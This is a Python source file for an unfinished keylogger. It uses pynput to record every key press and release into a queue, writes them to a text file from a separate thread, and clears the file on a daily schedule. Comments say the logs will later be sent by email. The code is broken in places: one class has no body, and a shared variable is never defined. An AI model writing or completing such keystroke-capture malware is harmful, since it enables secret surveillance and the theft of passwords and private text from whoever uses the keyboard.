from logging import exception
import pygetwindow
import queue
import pynput
import threading
import time
import schedule

f_lock = threading.Lock()



class FileManipulator



#the writer class to write to a file
class TheWriter:
    @staticmethod
#PUSH TO CLASS
    def write_to_file():
        f = open("demofile.txt", "w")

        while True:
            time.sleep(0.2)
            #if the file isn't being erased write to it
            global currently_dumping
            if currently_dumping != 1:
                #try block to handle empty block
                try:
                    #get the fifo logg
                    logg = PyLoggs.keyQueue.get_nowait()
                    f.write(logg)
                except queue.Empty as e:
                    print(f"Queue is empty test successful: {e}")
            else:
                f.close()
                #this will be replaced with block below in final version
                break
                '''
                FINAL PART WE ARE EXITING EARLY FOR PRACTICE
                while currently_dumping == 1:
                    time.sleep(1)
                f = open("demofile.txt", "a")
                
                '''



class PyLoggs:
#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
# * EASY MISTAKE TO FORGET

    #keystroke list
    keyQueue = queue.Queue(maxsize=-1)

    #class method to add key press to list
    @classmethod      #Key for spec keys or KeyCode for normal
    def on_press(cls, key, injected):
        try:
            key_press = 'alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked')
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)
        except AttributeError:
            key_press = 'special key {} pressed'.format(
                key)
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)


    @classmethod
    def on_release(cls, key, injected):
        key_release = '{} released; it was {}'.format(
            key, 'faked' if injected else 'not faked')
        #adding item to end of list
        PyLoggs.keyQueue.put_nowait(key_release)
        '''
        if key == pynput.keyboard.Key.esc:
            # Stop listener
            return False
        '''

    #main method for listen
    @classmethod
    def board_listen(cls):
        #here we will start our non-blocking listener and then while loop check fo the global variable with a momentary sleep to not spam cpu
        my_key_lstnr = pynput.keyboard.Listener(
            on_press=PyLoggs.on_press,
            on_release=PyLoggs.on_release)
        my_key_lstnr.start()#start listener

        #this is TESTING REMOVE
        #this listens for when we will the timer is done reading from the file
        #and then later will overwrite the file after it send the email
        global currently_dumping
        while currently_dumping != 1:
            time.sleep(0.5)
        my_key_lstnr.stop()#stop listener
        time.sleep(20)#just leting io cleanup for tst



class timer:
#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
# * EASY MISTAKE TO FORGET

    '''
    This method is scheduled for the top of the hour
    Will set a global var for the writer to stop writing to a file
    '''
    @staticmethod
    @schedule.repeat(schedule.every().day.at("11:17"))
    def send_overwrite():
        #this function sends the email and overwrites the file
        #this function will set the global variable for the writer to release the lock
        
        global currently_dumping
        currently_dumping = 1
        #new function
        #currently_dumping
        f = open("demofile.txt", "w")
        f.close()

    @classmethod
    def run_my_scedule(cls):
        #looping to check the time
        while True:
            schedule.run_pending()
            #this function will later call the send_overwrite
            time.sleep(1)


##########################################


def main():
#REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
# * EASY MISTAKE TO FORGET

    #daeomonized thread will exit when all other non-daemons exit
    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
    #declaring and defining the logging thread
    t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
    #daeomonized thread will exit when all other non-daemons exit
    t_writer = threading.Thread(target=TheWriter.write_to_file, daemon=True, args=()).start()
    #starting the main logging thread
    t_loggs.start()
    t_loggs.join()


if __name__ == "__main__":
    main()

'''
Current Workflow
    > Write the file manipulator methods and locks
    > Clean up the other classes
      > Just implement calls for now
    > Clean up comments
    > Then dive further into semaphores and signals.

REMEMBER LATER TO ACTUALLY RESET THOSE VARIABLES
  * EASY MISTAKE TO FORGET
'''
